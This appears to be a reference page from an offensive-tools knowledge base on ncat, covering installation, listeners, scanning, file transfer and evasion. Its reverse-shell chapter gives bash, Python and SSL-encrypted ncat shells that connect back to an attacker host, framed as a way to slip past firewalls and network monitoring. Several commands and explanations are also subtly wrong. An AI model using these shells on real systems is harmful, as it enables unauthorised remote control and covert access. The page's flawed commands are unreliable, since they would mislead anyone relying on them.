---
title: "ncat - Nmap's Netcat Implementation"
description: "Versatile network utility with SSL support for encrypted connections, port scanning, and data transfer"
category: "reverse_shells"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
package: "ncat"
kali_install: "sudo apt install ncat"
version: "5.7N1"
---

# ncat

## Overview

ncat is a feature-packed reimplementation of netcat, developed as part of the Nmap project. It provides reliable data transfer, port scanning, and SSL/TLS encryption capabilities. ncat supports both TCP and UDP protocols, can act as a listener or client, and includes features for access control, proxy connections, and chat functionality.

## Chapter 1: Installation

### Kali Linux

```bash
sudo apt install ncat
```

### Source Build

```bash
git clone https://github.com/nmap/ncat.git
cd ncat
./configure && make && sudo make install
```

### Verify Installation

```bash
ncat --version
```

## Chapter 2: Basic Usage

### Listen for Connections

```bash
ncat -lvnp 4444
```

**Explanation**: The `-l` flag sets listener mode, `-v` enables verbose output, `-n` disables DNS resolution, `-p` specifies the port. ncat listens for incoming TCP connections on port 4444.

### Connect to Remote Host

```bash
ncat 192.168.1.100 4444
```

**Explanation**: Establishes a TCP connection to port 4444 on the specified host. Once connected, data can be sent and received interactively.

### UDP Mode

```bash
ncat -u -lvnp 4444
```

**Explanation**: The `-u` flag switches to UDP mode. UDP connections are connectionless, so the behavior differs from TCP — there is no handshake or guaranteed delivery.

## Chapter 3: Reverse Shells

### Bash Reverse Shell

```bash
# Attacker
ncat -lvnp 4444

# Target
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Explanation**: The target initiates a connection back to the attacker, bypassing inbound firewall rules. The bash shell's I/O is redirected over the network connection.

### Python Reverse Shell

```python
# Target
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

**Explanation**: Python creates a socket connection to the attacker and duplicates the file descriptors for stdin, stdout, and stderr to the socket, providing a fully interactive shell.

### Ncat SSL Reverse Shell

```bash
# Attacker
ncat --ssl -lvnp 4444

# Target
ncat --ssl ATTACKER_IP 4444 -e /bin/sh
```

**Explanation**: The `--ssl` flag encrypts the connection using SSL/TLS. The `-e` flag executes `/bin/sh` and connects its I/O to the remote host. SSL prevents network monitoring tools from reading the shell traffic.

## Chapter 4: Port Scanning

### TCP Scan

```bash
ncat -zv 192.168.1.1 -p 1-1000
```

**Explanation**: The `-z` flag enables zero-I/O mode (scanning without data transfer), and `-v` shows open ports. This scans TCP ports 1 through 1000 on the target.

### UDP Scan

```bash
ncat -zu 192.168.1.1 -p 53,67,68,123
```

**Explanation**: The `-z` and `-u` flags combine for UDP scanning. This checks specific UDP ports for responses, useful for identifying services like DNS (53), DHCP (67/68), and NTP (123).

## Chapter 5: File Transfer

### Send File

```bash
# Receiver
ncat -lvnp 4444 > received_file

# Sender
ncat 192.168.1.100 4444 < file_to_send
```

**Explanation**: Data flows from the sender's file through the network connection to the receiver's file. This method works through most firewalls since it uses a single outbound connection.

### Banner Grabbing

```bash
ncat -v 192.168.1.1 80
GET / HTTP/1.1
Host: 192.168.1.1

```

**Explanation**: Connect to a web server port and manually send an HTTP request to retrieve the server's banner and response headers. This technique identifies web server software and versions.

## Chapter 6: Access Control

### Allow Only Specific Connections

```bash
ncat -lvnp 4444 --allow 192.168.1.0/24
```

**Explanation**: The `--allow` flag restricts connections to the specified CIDR range. Only hosts within 192.168.1.0/24 can connect, providing basic access control for the listener.

### Proxy Mode

```bash
ncat -lvnp 8080 --proxy ATTACKER_IP:3128 --proxy-type http
```

**Explanation**: ncat acts as a proxy server, forwarding connections through an upstream HTTP proxy. This is useful for pivoting through compromised proxy infrastructure.

## Chapter 7: Advanced Techniques

### SSL Server with Client Certificate

```bash
ncat --ssl-cert server.pem --ssl-key server-key.pem -lvnp 4444
```

**Explanation**: Configures the SSL listener with a specific certificate and key. This provides server authentication, allowing clients to verify the server's identity.

### Chat Server

```bash
# Server
ncat -lvnp 4444

# Client
ncat 192.168.1.100 4444
```

**Explanation**: With no `-e` flag or redirections, ncat provides a bidirectional chat interface. Both sides can type messages that appear on the other side's terminal.

### Relay Mode

```bash
ncat -lvnp 4444 | ncat 192.168.1.100 5555
```

**Explanation**: ncat pipes data between a local listener and a remote host. Connections to port 4444 are forwarded to port 5555 on the target, acting as a simple port relay.

## Chapter 8: Evasion Techniques

### Fixed Source Port

```bash
ncat -p 53 -lvnp 4444
```

**Explanation**: Spoofing the source port as 53 (DNS) may bypass some firewall rules that trust DNS traffic. This is not reliable against modern stateful firewalls but may evade basic ACLs.

### Connection via HTTP Proxy

```bash
ncat --proxy proxy_host:3128 --proxy-type http target_host 4444
```

**Explanation**: Routes the connection through an HTTP CONNECT proxy, making the traffic appear as proxy requests to network monitors while reaching the actual target through the proxy.

## Resources

- [Ncat Documentation](https://nmap.org/ncat/)
- [Nmap Project](https://nmap.org/)
- [Kali Linux Ncat Page](https://www.kali.org/tools/ncat/)
- [Ncat man page](https://linux.die.net/man/1/ncat)
